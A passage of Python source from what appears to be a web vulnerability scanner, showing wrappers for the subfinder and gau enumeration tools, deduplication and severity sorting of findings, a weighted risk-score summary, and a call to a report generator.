                    urls.append(line)
        return urls

    async def _run_subfinder(self, domain: str) -> dict[str, Any]:
        stdout, stderr, rc = await self._run_tool(
            ["subfinder", "-d", domain, "-silent"],
            self._tool_timeout, "subfinder",
        )
        if not stdout:
            return {"available": False, "error": stderr.strip()}
        return {"available": True, "subdomains": [s for s in stdout.splitlines() if s.strip()]}

    async def _run_gau(self, domain: str) -> dict[str, Any]:
        stdout, stderr, rc = await self._run_tool(
            ["gau", "--json", domain],
            self._tool_timeout, "gau",
        )
        if not stdout:
            return {"available": False, "error": stderr.strip()}
        urls: list[str] = []
        for line in stdout.splitlines():
            line = line.strip()
            if not line:
                continue
            try:
                d = json.loads(line)
                urls.append(d.get("url", ""))
            except (json.JSONDecodeError, ValueError):
                if line.startswith("http"):
                    urls.append(line)
        return {"available": True, "urls": urls[:200], "count": len(urls)}

    # =========================================================================
    # Deduplication and Summary
    # =========================================================================

    @staticmethod
    def _deduplicate(findings: list[WebFinding]) -> list[WebFinding]:
        """Remove duplicate findings with identical (title, endpoint, parameter)."""
        seen:   set[str]         = set()
        unique: list[WebFinding] = []
        for f in findings:
            key = f"{f.title}|{f.endpoint}|{f.parameter}"
            if key not in seen:
                seen.add(key)
                unique.append(f)
        unique.sort(key=lambda f: (
            ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"].index(f.severity.value),
            -f.confidence,
        ))
        return unique

    def _compute_summary(
        self,
        findings:   list[WebFinding],
        started_at: float,
        ended_at:   float,
        surface:    AttackSurface,
    ) -> WebScanSummary:
        by_sev: dict[str, int] = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
        by_cat: dict[str, int] = {}
        for f in findings:
            by_sev[f.severity.value] = by_sev.get(f.severity.value, 0) + 1
            cat = f.cwe
            by_cat[cat] = by_cat.get(cat, 0) + 1

        # Risk score: weighted sum, capped at 100
        risk = min(100.0, (
            by_sev["CRITICAL"] * 20
            + by_sev["HIGH"]   * 10
            + by_sev["MEDIUM"] *  4
            + by_sev["LOW"]    *  1
        ))

        return WebScanSummary(
            total_findings           = len(findings),
            critical                 = by_sev["CRITICAL"],
            high                     = by_sev["HIGH"],
            medium                   = by_sev["MEDIUM"],
            low                      = by_sev["LOW"],
            info                     = by_sev["INFO"],
            by_category              = by_cat,
            risk_score               = round(risk, 1),
            scan_duration_seconds    = round(ended_at - started_at, 2),
            urls_scanned             = len(surface.urls),
            forms_tested             = len(surface.forms),
            parameters_tested        = sum(len(v) for v in surface.parameters.values()),
            advanced_module_findings = self._advanced_module_findings,
        )

    # =========================================================================
    # Report Generation
    # =========================================================================

    async def generate_report(self, result: WebAssessmentResult) -> dict[str, Any]:
        """
        Produce JSON + Markdown reports and write them to the configured output directory.
        Returns the report dictionary.
        """
        from reporting.web_report_generator import WebReportGenerator
        gen    = WebReportGenerator(config=self._cfg.get("reporting", {}))
        report = gen.generate(result)
        return report